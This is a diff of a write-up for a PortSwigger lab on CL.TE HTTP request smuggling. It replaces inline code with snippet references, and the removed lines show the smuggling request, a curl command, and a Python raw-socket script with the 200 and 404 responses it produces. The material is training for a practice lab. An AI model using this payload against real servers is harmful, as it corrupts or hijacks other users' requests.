@@ -10,6 +10,7 @@ lang: "en"
 
 import CollapsiblePartial from '../../components/CollapsiblePartial.astro';
 import PartialContainer from '../../components/PartialContainer.astro';
+import CodeSnippet from '../../components/CodeSnippet.astro';
 
 ## Necessary Background Concepts To Solve The Lab
 
@@ -24,29 +25,13 @@ import PartialContainer from '../../components/PartialContainer.astro';
 
 In Burp, PortSwigger's solution is to send this request **twice** in Repeater (HTTP/1.1). The first send leaves a smuggled prefix on the back-end connection; the second should get `404 Not Found`. For this lab, that differential `404` *is* the solution.
 
-```http
-POST / HTTP/1.1
-Host: <lab-url>.web-security-academy.net
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 35
-Transfer-Encoding: chunked
-
-0
-
-GET /404 HTTP/1.1
-X-Ignore: X
-```
+<CodeSnippet file="http-request-smuggling-confirming-cl-te-via-differential-responses/burp-smuggle.http" />
 
 ### Why curl alone is not enough
 
 Let's force HTTP/1.1 and try to send both length headers:
 
-```bash
-curl -s --http1.1 -D - "https://<lab-url>.web-security-academy.net/" \
-  -H "Transfer-Encoding: chunked" \
-  -H "Content-Length: 35" \
-  --data-binary $'0\r\n\r\nGET /404 HTTP/1.1\r\nX-Ignore: X' -o /dev/null
-```
+<CodeSnippet file="http-request-smuggling-confirming-cl-te-via-differential-responses/curl-both-headers.sh" />
 
 > **Command breakdown**: \
 `--http1.1` = use HTTP/1.1 (needed for this attack; HTTP/2 won't work the same way) \
@@ -66,10 +51,7 @@ We will rebuild the same idea without Burp, step by step.
 
 First, count the bytes of the **smuggled payload** (just the body of our request; every `\r\n` matters):
 
-```python
-print(len(b"0\r\n\r\nGET /404 HTTP/1.1\r\nX-Ignore: X"))
-# 35
-```
+<CodeSnippet file="http-request-smuggling-confirming-cl-te-via-differential-responses/payload-len.py" />
 
 > **Script breakdown**: \
 `print(len(...))` = count how many bytes the body has, so `Content-Length` can match exactly \
@@ -89,11 +71,7 @@ That matches `Content-Length: 35`.
 3. The back-end never reads `GET /404 HTTP/1.1\r\nX-Ignore: X`, so those bytes sit unread in its receive buffer
 4. The next request on that connection is glued onto the leftover. For example, if the next user (or our second send) starts with `POST / HTTP/1.1...`, the back-end effectively sees:
 
-```http
-GET /404 HTTP/1.1
-X-Ignore: XPOST / HTTP/1.1
-Host: ...
-```
+<CodeSnippet file="http-request-smuggling-confirming-cl-te-via-differential-responses/leftover-glue.http" />
 
 The back-end therefore runs our smuggled `GET /404`, not whatever the next user asked for. Their real request (here `POST /`) is only appended onto `X-Ignore`, which is very likely ignored as an unknown header. So they get **404 Not Found**, no matter which endpoint they meant to hit.
 
@@ -101,33 +79,11 @@ The back-end therefore runs our smuggled `GET /404`, not whatever the next user 
 
 First we'll use Python sockets to send the smuggling request once and leave `GET /404` sitting unread in the back-end buffer. Then, on a separate normal connection, we'll use curl to request `/` like the next user would. Our curl is a new client connection; the front-end may still reuse the same back-end socket, which is how the leftover bytes get applied. That second request should get the smuggled **404**:
 
-```python
-import ssl, socket
-
-host = "<lab-url>.web-security-academy.net"
-body = b"0\r\n\r\nGET /404 HTTP/1.1\r\nX-Ignore: X"
-
-ctx = ssl.create_default_context()
-with socket.create_connection((host, 443), timeout=10) as raw:
-    with ctx.wrap_socket(raw, server_hostname=host) as sock:
-        sock.settimeout(5)
-        req = (
-            f"POST / HTTP/1.1\r\n"
-            f"Host: {host}\r\n"
-            f"Content-Type: application/x-www-form-urlencoded\r\n"
-            f"Content-Length: {len(body)}\r\n"
-            f"Transfer-Encoding: chunked\r\n"
-            f"\r\n"
-        ).encode() + body
-        sock.sendall(req)
-        print(sock.recv(4096).split(b"\r\n", 1)[0].decode())
-```
+<CodeSnippet file="http-request-smuggling-confirming-cl-te-via-differential-responses/smuggle-socket.py" />
 
 Output:
 
-```
-HTTP/1.1 200 OK
-```
+<CodeSnippet file="http-request-smuggling-confirming-cl-te-via-differential-responses/response-200.http" />
 
 > **Script breakdown**: \
 `ssl` + `socket` = send raw HTTP/1.1 over HTTPS, no auto-fixes from curl \
@@ -137,18 +93,9 @@ HTTP/1.1 200 OK
 
 Then trigger the next request as a normal user with curl:
 
-```bash
-curl -si --http1.1 "https://<lab-url>.web-security-academy.net/"
-```
+<CodeSnippet file="http-request-smuggling-confirming-cl-te-via-differential-responses/curl-trigger.sh" />
 
-```
-HTTP/1.1 404 Not Found
-Content-Type: application/json; charset=utf-8
-Connection: close
-Content-Length: 11
-
-"Not Found"
-```
+<CodeSnippet file="http-request-smuggling-confirming-cl-te-via-differential-responses/response-404.http" />
 
 > **Command breakdown**: \
 `-s` = silent mode (no progress meter) \
